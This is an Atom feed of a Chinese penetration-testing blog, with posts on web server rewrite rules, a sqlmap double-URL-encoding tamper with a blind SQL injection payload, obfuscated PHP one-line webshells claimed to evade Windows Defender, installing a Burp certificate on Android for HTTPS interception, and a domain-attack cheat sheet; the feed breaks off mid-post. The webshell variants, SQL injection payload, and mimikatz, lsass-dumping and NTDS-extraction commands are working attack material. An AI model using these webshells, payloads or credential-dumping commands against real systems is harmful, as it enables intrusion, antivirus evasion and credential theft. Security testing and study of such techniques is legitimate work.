<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Nice&#39;s Blog</title>
  
  
  <link href="http://nice759.com/atom.xml" rel="self"/>
  
  <link href="http://nice759.com/"/>
  <updated>2022-03-17T09:22:55.650Z</updated>
  <id>http://nice759.com/</id>
  
  <author>
    <name>Nice</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>几种伪静态配置</title>
    <link href="http://nice759.com/2022/03/17/%E5%87%A0%E7%A7%8D%E4%BC%AA%E9%9D%99%E6%80%81%E9%85%8D%E7%BD%AE/"/>
    <id>http://nice759.com/2022/03/17/%E5%87%A0%E7%A7%8D%E4%BC%AA%E9%9D%99%E6%80%81%E9%85%8D%E7%BD%AE/</id>
    <published>2022-03-17T05:28:15.000Z</published>
    <updated>2022-03-17T09:22:55.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apache伪静态-即系统自带的-htaccess文件-："><a href="#Apache伪静态-即系统自带的-htaccess文件-：" class="headerlink" title="Apache伪静态(即系统自带的.htaccess文件)："></a>Apache伪静态(即系统自带的.htaccess文件)：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s&#x3D;$1 [QSA,PT,L]</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Nginx伪静态："><a href="#Nginx伪静态：" class="headerlink" title="Nginx伪静态："></a>Nginx伪静态：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">    #&#x2F;&#x2F;...省略部分代码</span><br><span class="line">    if (!-e $request_filename)&#123;</span><br><span class="line">        rewrite  ^(.*)$  &#x2F;index.php?s&#x3D;$1  last;   break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果你的应用安装在二级目录，Nginx的伪静态方法设置如下，其中youdomain是所在的目录名称。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;youdomain&#x2F; &#123;</span><br><span class="line">    if (!-e $request_filename)&#123;</span><br><span class="line">        rewrite  ^&#x2F;youdomain&#x2F;(.*)$  &#x2F;youdomain&#x2F;index.php?s&#x3D;$1  last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>举个栗子：<br>如果你用的是本机电脑上的phpstudy环境的话，打开配置文件( nginx/conf/vhost.conf )：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">    index  index.html index.htm index.php;</span><br><span class="line">    #autoindex  on;</span><br><span class="line">    if (!-e $request_filename) &#123;</span><br><span class="line">        rewrite ^(.*)$ &#x2F;index.php?s&#x3D;$1 last; break;</span><br><span class="line">    &#125;            </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="IIS伪静态："><a href="#IIS伪静态：" class="headerlink" title="IIS伪静态："></a>IIS伪静态：</h1><ul><li>如果你的服务器环境支持ISAPI_Rewrite的话，可以配置httpd.ini文件，添加下面的内容：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule (.*)$ &#x2F;index\.php\?s&#x3D;$1 [I]</span><br></pre></td></tr></table></figure></li><li>在IIS的高版本下面可以配置web.config，在中间添加rewrite节点：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;rewrite&gt;</span><br><span class="line"> &lt;rules&gt;</span><br><span class="line"> &lt;rule name&#x3D;&quot;OrgPage&quot; stopProcessing&#x3D;&quot;true&quot;&gt;</span><br><span class="line"> &lt;match url&#x3D;&quot;^(.*)$&quot; &#x2F;&gt;</span><br><span class="line"> &lt;conditions logicalGrouping&#x3D;&quot;MatchAll&quot;&gt;</span><br><span class="line"> &lt;add input&#x3D;&quot;&#123;HTTP_HOST&#125;&quot; pattern&#x3D;&quot;^(.*)$&quot; &#x2F;&gt;</span><br><span class="line"> &lt;add input&#x3D;&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType&#x3D;&quot;IsFile&quot; negate&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line"> &lt;add input&#x3D;&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType&#x3D;&quot;IsDirectory&quot; negate&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;conditions&gt;</span><br><span class="line"> &lt;action type&#x3D;&quot;Rewrite&quot; url&#x3D;&quot;index.php?s&#x3D;&#123;R:1&#125;&quot; &#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;rule&gt;</span><br><span class="line"> &lt;&#x2F;rules&gt;</span><br><span class="line">&lt;&#x2F;rewrite&gt;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Apache伪静态-即系统自带的-htaccess文件-：&quot;&gt;&lt;a href=&quot;#Apache伪静态-即系统自带的-htaccess文件-：&quot; class=&quot;headerlink&quot; title=&quot;Apache伪静态(即系统自带的.htaccess文件)：&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="其他" scheme="http://nice759.com/Categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="伪静态" scheme="http://nice759.com/tags/%E4%BC%AA%E9%9D%99%E6%80%81/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap-doubleurlencode-tamper</title>
    <link href="http://nice759.com/2022/03/17/sqlmap-doubleurlencode-tamper/"/>
    <id>http://nice759.com/2022/03/17/sqlmap-doubleurlencode-tamper/</id>
    <published>2022-03-17T04:28:15.000Z</published>
    <updated>2022-03-17T09:22:17.171Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqlmap-DoubleUrlencode-tamper"><a href="#Sqlmap-DoubleUrlencode-tamper" class="headerlink" title="Sqlmap-DoubleUrlencode-tamper"></a>Sqlmap-DoubleUrlencode-tamper</h1><p>DoubleUrlencode for sqlmap tamper</p><p>在一次渗透测试过程中，遇到了两次Url编码的案例，因此改了一个简单的tamper</p><h1 id="Quoete"><a href="#Quoete" class="headerlink" title="Quoete()"></a>Quoete()</h1><ul><li>传入参数类型：字符串</li><li>功能：将单个字符串编码转化为 %xx 的形式</li><li>导入：from urllib.parse import quote</li><li>Ps：url多个字符串编码用urlenocde()函数<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2></li><li>payload: ‘ AND (SELECT 2634 FROM (SELECT(SLEEP(2-(IF((SELECT (CASE WHEN ((SELECT super_priv FROM mysql.user WHERE user=0x726f6f74 LIMIT 0,1)=0x59) THEN 1 ELSE 0 END))=1,0,2)))))aoEO) AND ‘OpQi’=’OpQi</li></ul><p>sqlmap自带的urlencode效果<br><img src="https://user-images.githubusercontent.com/100123029/155446733-faa153e7-a949-4778-89d6-e90b7e5466de.png" alt="image"></p><ul><li><p>urlencode：/%27%20AND%20%28SELECT%202634%20FROM%20%28SELECT%28SLEEP%282-%28IF%28%28SELECT%20%28CASE%20WHEN%20%28%28SELECT%20super_priv%20FROM%20mysql.user%20WHERE%20user%3D0x726f6f74%20LIMIT%200%2C1%29%3D0x59%29%20THEN%201%20ELSE%200%20END%29%29%3D1%2C0%2C2%29%29%29%29%29aoEO%29%20AND%20%27OpQi%27%3D%27OpQi</p></li><li><p>doubleurlencode：%25%32%37%25%32%30%41%4e%44%25%32%30%25%32%38%53%45%4c%45%43%54%25%32%30%32%36%33%34%25%32%30%46%52%4f%4d%25%32%30%25%32%38%53%45%4c%45%43%54%25%32%38%53%4c%45%45%50%25%32%38%32%2d%25%32%38%49%46%25%32%38%25%32%38%53%45%4c%45%43%54%25%32%30%25%32%38%43%41%53%45%25%32%30%57%48%45%4e%25%32%30%25%32%38%25%32%38%53%45%4c%45%43%54%25%32%30%73%75%70%65%72%5f%70%72%69%76%25%32%30%46%52%4f%4d%25%32%30%6d%79%73%71%6c%2e%75%73%65%72%25%32%30%57%48%45%52%45%25%32%30%75%73%65%72%25%33%44%30%78%37%32%36%66%36%66%37%34%25%32%30%4c%49%4d%49%54%25%32%30%30%25%32%43%31%25%32%39%25%33%44%30%78%35%39%25%32%39%25%32%30%54%48%45%4e%25%32%30%31%25%32%30%45%4c%53%45%25%32%30%30%25%32%30%45%4e%44%25%32%39%25%32%39%25%33%44%31%25%32%43%30%25%32%43%32%25%32%39%25%32%39%25%32%39%25%32%39%25%32%39%61%6f%45%4f%25%32%39%25%32%30%41%4e%44%25%32%30%25%32%37%4f%70%51%69%25%32%37%25%33%44%25%32%37%4f%70%51%69</p></li><li><p>BP<br><img src="https://user-images.githubusercontent.com/100123029/155447021-079fb7df-962c-4fcf-9be0-7e383a3918b1.png" alt="image"></p></li><li><p>test.py<br><img src="https://user-images.githubusercontent.com/100123029/155448429-8c361ae5-c4bb-4b40-8167-090dbe0a09c4.png" alt="image"></p></li><li><p>tamper<br><img src="https://user-images.githubusercontent.com/100123029/155448629-4f26eacd-918d-48df-b6d3-5ce2e506306f.png" alt="image"></p></li><li><p>效果<br><img src="https://user-images.githubusercontent.com/100123029/155449152-7d2bb427-abe0-4290-9675-5cb0570ce86f.png" alt="image"></p></li><li><p>tamper地址：<a href="https://github.com/N1ce759/Sqlmap-DoubleUrlencode-tamper">https://github.com/N1ce759/Sqlmap-DoubleUrlencode-tamper</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Sqlmap-DoubleUrlencode-tamper&quot;&gt;&lt;a href=&quot;#Sqlmap-DoubleUrlencode-tamper&quot; class=&quot;headerlink&quot; title=&quot;Sqlmap-DoubleUrlencode-tamper&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="python" scheme="http://nice759.com/Categories/python/"/>
    
    
    <category term="tamper" scheme="http://nice759.com/tags/tamper/"/>
    
    <category term="sqlmap" scheme="http://nice759.com/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>php一句话简单混淆</title>
    <link href="http://nice759.com/2022/03/17/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86/"/>
    <id>http://nice759.com/2022/03/17/php%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%AE%80%E5%8D%95%E6%B7%B7%E6%B7%86/</id>
    <published>2022-03-17T03:28:15.000Z</published>
    <updated>2022-03-17T08:23:38.041Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>原始一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[a]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>php变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; &quot;assert&quot;;</span><br><span class="line">$a(@$_POST[&#39;shell&#39;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第三行使用了变量函数$a，变量储存了函数名asse，便可以直接用变量替代函数名。</p></li><li><p>php变量简单变形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a&#x3D;&quot;TR&quot;.&quot;Es&quot;.&quot;sA&quot;;  </span><br><span class="line">$b&#x3D;strtolower($a);  </span><br><span class="line">$c&#x3D;strrev($b);  </span><br><span class="line">@$c($_POST[&#39;shell&#39;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用字符串拼接、大小写混淆、字符串逆序组合而成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a&#x3D;&quot;AssERT&quot;;  </span><br><span class="line">$b&#x3D;strtolower($a);  </span><br><span class="line">@$b($_POST[&#39;shell&#39;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用大小写混淆配合字符串转小写函数strtolower组合而成</p></li><li><p>PHP可变变量(不好用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$bb&#x3D;&quot;assert&quot;;</span><br><span class="line">$a&#x3D;&#39;bb&#39;;</span><br><span class="line">$$aa($_POST[&#39;shell&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>以上代码可表示为*$$aa = $($aa) = $ (‘bb’) = $bb = “assert”* </p></li><li><p>自定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">function fun($a)&#123;  </span><br><span class="line">    @eval($a);  </span><br><span class="line">&#125;  </span><br><span class="line">@fun($_POST[&#39;shell&#39;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用function自定义函数，然后函数来调用eval函数</p></li><li><p>create_function函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$fun &#x3D; create_function(&#39;&#39;,$_POST[&#39;shell&#39;]);</span><br><span class="line">$fun();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>创建了一个匿名函数，并返回了一个独一无二的函数名，然后再调用此函数</p></li><li><p>call_user_func()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@call_user_func(assert,$_POST[&#39;shell&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>call_user_func()函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数</p></li><li><p>base64_decode 函数（不好使）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">$a&#x3D;base64_decode(&quot;YXNzZXJ0&quot;);  </span><br><span class="line">@a($_POST[&#39;shell&#39;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>YXNzZXJ0是assert的base64编码，base64_decode()是base64解密函数</p></li><li><p>preg_replace函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">    function fun()&#123;  </span><br><span class="line">        return $_POST[&#39;shell&#39;];  </span><br><span class="line">    &#125;  </span><br><span class="line">    @preg_replace(&quot;&#x2F;test&#x2F;e&quot;, fun(), &quot;test123&quot;);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个/之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行。<br>蚁剑最好用base64加解密</p></li><li><p>pares_str函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&quot;a&#x3D;eval&quot;;</span><br><span class="line">parse_str($str);</span><br><span class="line">$a($_POST[&#39;shell&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行pares_str函数后可以生成一个名为$a，值为”eval”的变量。</p></li><li><p>str_replace函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; str_replace(&quot;test&quot;, &quot;&quot;, &quot;astestsert&quot;);</span><br><span class="line">$a($_POST[&#39;shell&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>此函数用于将第三个参数中的第一个参数替换为第二个参数</p></li></ul><p>以上的一句话可以过过Defender，bypasswaf还得更深入研究。<br>POST也可替换成GET，但同时shell的传递方式也要改为GET形式，在使用一句话木马时，也可以在前面加一个@来屏蔽错误，增加其隐蔽性。</p><ul><li>RE：<br><a href="https://www.cnblogs.com/linuxsec/articles/12078206.html">https://www.cnblogs.com/linuxsec/articles/12078206.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;p&gt;原始一句话&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class</summary>
      
    
    
    
    <category term="PHP" scheme="http://nice759.com/Categories/PHP/"/>
    
    
    <category term="php" scheme="http://nice759.com/tags/php/"/>
    
    <category term="免杀" scheme="http://nice759.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>APP渗透：BP抓取安卓7+HTTPS流量</title>
    <link href="http://nice759.com/2022/03/17/APP%E6%B8%97%E9%80%8F%EF%BC%9ABP%E6%8A%93%E5%8F%96%E5%AE%89%E5%8D%937+HTTPS%E6%B5%81%E9%87%8F/"/>
    <id>http://nice759.com/2022/03/17/APP%E6%B8%97%E9%80%8F%EF%BC%9ABP%E6%8A%93%E5%8F%96%E5%AE%89%E5%8D%937+HTTPS%E6%B5%81%E9%87%8F/</id>
    <published>2022-03-17T02:28:15.000Z</published>
    <updated>2022-03-17T09:23:37.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Before"><a href="#Before" class="headerlink" title="Before"></a>Before</h1><p>Android7以后，系统不再信任用户级的证书，只信任系统级的证书，所以要抓包就需要把我们的代理程序证书安装至Android的系统目录中。</p><h1 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h1><p>流行于百度，实测效果不是很好，所以又摸索了第二种方式，建议直接看点右边目录看第二种</p><h2 id="导出证书"><a href="#导出证书" class="headerlink" title="导出证书"></a>导出证书</h2><ul><li><p>BP导出证书<br><img src="https://s2.loli.net/2022/03/17/PbXvn6FgWO7jrN9.png" alt="图片.png"></p></li><li><p>保存为bp.cer<br><img src="https://s2.loli.net/2022/03/17/u8CF6UGyeWpfLjP.png" alt="图片.png"></p></li></ul><h2 id="制作证书"><a href="#制作证书" class="headerlink" title="制作证书"></a>制作证书</h2><ul><li><p>把刚刚得到的bp.cer证书放到kali或服务器，这一步需要用到openssl</p></li><li><p>命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -subject_hash_old -in bp.cer</span><br></pre></td></tr></table></figure></li><li><p>结果如下：<br><img src="https://s2.loli.net/2022/03/17/lBZc1F9Krphdua7.png" alt="图片.png"></p></li><li><p>本地创建一个<strong>9a5ba575.0</strong>文件，把上面的结果复制进去<br><img src="https://s2.loli.net/2022/03/17/7cFfE3Ob4yKDx2G.png" alt="图片.png"></p></li><li><p>然后执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -text -in bp.cer -out 9a5ba575.0</span><br></pre></td></tr></table></figure></li><li><p>结果<br><img src="https://s2.loli.net/2022/03/17/djyqJ7gDBAozL9x.png" alt="图片.png"></p></li><li><p>将内容复制到刚刚创建的<strong>9a5ba575.0</strong>中<br><img src="https://s2.loli.net/2022/03/17/xb2ydBv5CD9IYWl.png" alt="图片.png"></p></li><li><p>接下来将这个证书导入到夜神模拟器中</p></li><li><p>首先需要安装一个<em>RE文件管理器</em>，这一步需要root权限</p></li><li><p>将证书放到**/system/etc/security/cacerts**中，即系统证书目录<br><img src="https://s2.loli.net/2022/03/17/VgOZA24ulkILYt9.png" alt="图片.png"></p></li><li><p>重启模拟器</p></li><li><p>代理配置</p></li><li><p>配置如下<br><img src="https://s2.loli.net/2022/03/17/oBNuZqvyhM4SwFL.png" alt="图片.png"></p></li><li><p>成功抓包<br><img src="https://s2.loli.net/2022/03/17/eiSQoKusJbR2CHz.png" alt="图片.png"></p></li></ul><h1 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h1><ul><li><p>从浏览器导出信任的.cer bp证书，需要浏览器先安装好bp证书，具体安装方式这里就不阐述了<br><img src="https://s2.loli.net/2022/03/17/MX56wJrzdpjoLeN.png" alt="图片.png"></p></li><li><p>直接丢到模拟器中安装<br><img src="https://s2.loli.net/2022/03/17/YIp7tWwCV8am2Fx.png" alt="图片.png"></p></li><li><p>在模拟器中找到设置-安全-从SD卡中安装<br><img src="https://s2.loli.net/2022/03/17/9gMYw7WaHsOkdxG.png" alt="图片.png"></p></li><li><p>安装完毕后在模拟器中下载re文件管理器</p></li><li><p>进入：**/data/misc/user/0/cacerts-added** 这个文件夹下（该目录存储的是用户自己安装的证书文件）<br><img src="https://s2.loli.net/2022/03/17/NE2SZcq7GPCagos.png" alt="图片.png"></p></li><li><p>复制该.0文件（文件名可能是不一样的）</p></li><li><p>复制到系统证书目录**/etc/security/cacerts** 下（re文件管理器需要挂载读写权限、模拟器中自带root管理授权即可）</p></li><li><p>修改wifi代理为这个证书设置的代理<br><img src="https://s2.loli.net/2022/03/17/VmgoBu8QXHT9ad7.png" alt="图片.png"></p></li></ul><p><strong>亲测这种方式比第一种管用</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Before&quot;&gt;&lt;a href=&quot;#Before&quot; class=&quot;headerlink&quot; title=&quot;Before&quot;&gt;&lt;/a&gt;Before&lt;/h1&gt;&lt;p&gt;Android7以后，系统不再信任用户级的证书，只信任系统级的证书，所以要抓包就需要把我们的代理程序证书安装</summary>
      
    
    
    
    <category term="APP渗透" scheme="http://nice759.com/Categories/APP%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="APP渗透" scheme="http://nice759.com/tags/APP%E6%B8%97%E9%80%8F/"/>
    
    <category term="BurpSuit" scheme="http://nice759.com/tags/BurpSuit/"/>
    
  </entry>
  
  <entry>
    <title>域渗透速查手册</title>
    <link href="http://nice759.com/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/"/>
    <id>http://nice759.com/2022/03/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C/</id>
    <published>2022-03-14T08:49:53.000Z</published>
    <updated>2022-03-17T08:09:34.079Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-无凭证情况下"><a href="#1-无凭证情况下" class="headerlink" title="1.无凭证情况下"></a>1.无凭证情况下</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip_range&gt; # SMB 扫描存活主机</span><br><span class="line">nmap -sP -p &lt;ip&gt; # ping 扫描</span><br><span class="line">nmap -PN -sV --top-ports 50 --open &lt;ip&gt; # 快速扫描</span><br><span class="line">nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; # 检测 SMB 漏洞</span><br><span class="line">nmap -PN -sC -sV &lt;ip&gt; # 经典扫描</span><br><span class="line">nmap -PN -sC -sV -p- &lt;ip&gt; # 全扫描</span><br><span class="line">nmap -sU -sC -sV &lt;ip&gt; # UDP 扫描</span><br></pre></td></tr></table></figure><h2 id="漏洞快速探测"><a href="#漏洞快速探测" class="headerlink" title="漏洞快速探测"></a>漏洞快速探测</h2><p>扫描后可以去先用已知漏洞打</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">java rmi： exploit&#x2F;multi&#x2F;misc&#x2F;java_rmi_server</span><br><span class="line">ms17-010：exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">tomcat：auxiliary&#x2F;scanner&#x2F;http&#x2F;tomcat_enum</span><br><span class="line">jboss manager：exploit&#x2F;multi&#x2F;http&#x2F;tomcat_mgr_deploy</span><br><span class="line">Java反序列化漏洞测试：ysoserial</span><br><span class="line">查找产品的CVE漏洞：searchsploit</span><br><span class="line">MS14-025： searchsploit</span><br><span class="line">   findstr &#x2F;S &#x2F;I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</span><br><span class="line">爆破数据库连接：use admin&#x2F;mssql&#x2F;mssql_enum_sql_logins</span><br><span class="line">proxylogon：</span><br><span class="line">proxyshell：</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>低权限可以做的事情</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">winpeas.exe</span><br><span class="line">查找内容有 password 的文件：findstr &#x2F;si &#39;password&#39; *.txt *.xml *.docx</span><br><span class="line">Juicy Potato &#x2F; Lovely Potato</span><br><span class="line">PrintSpoofer</span><br><span class="line">RoguePotato</span><br><span class="line">SMBGhost CVE-2020-0796</span><br><span class="line">CVE-2021-36934 (HiveNightmare&#x2F;SeriousSAM)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="拥有本地管理员权限"><a href="#拥有本地管理员权限" class="headerlink" title="拥有本地管理员权限"></a>拥有本地管理员权限</h2><h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">hashdump: post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -M lsassy</span><br><span class="line">cme smb &lt;ip_range&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; --sam &#x2F; --lsa &#x2F; --ntds</span><br></pre></td></tr></table></figure><h3 id="绕过LSA防护策略读取密码"><a href="#绕过LSA防护策略读取密码" class="headerlink" title="绕过LSA防护策略读取密码"></a>绕过LSA防护策略读取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 